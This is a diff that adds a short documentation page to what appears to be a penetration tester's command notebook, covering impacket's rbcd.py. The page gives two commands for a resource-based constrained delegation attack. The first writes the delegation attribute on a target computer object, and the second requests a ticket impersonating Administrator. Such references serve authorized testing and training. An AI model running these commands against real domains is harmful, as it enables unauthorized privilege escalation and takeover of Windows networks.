@@ -1,0 +1,26 @@
+---
+title: "rbcd.py"
+sidebarTitle: "rbcd.py"
+description: "Commands and examples collected from your rbcd.py notes."
+keywords: ["rbcd.py", "impacket-rbcd"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/rbcd.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=rbcd) · [All tools](/index)
+
+## Resource-Based (RBCD)
+
+**Notebook example**
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
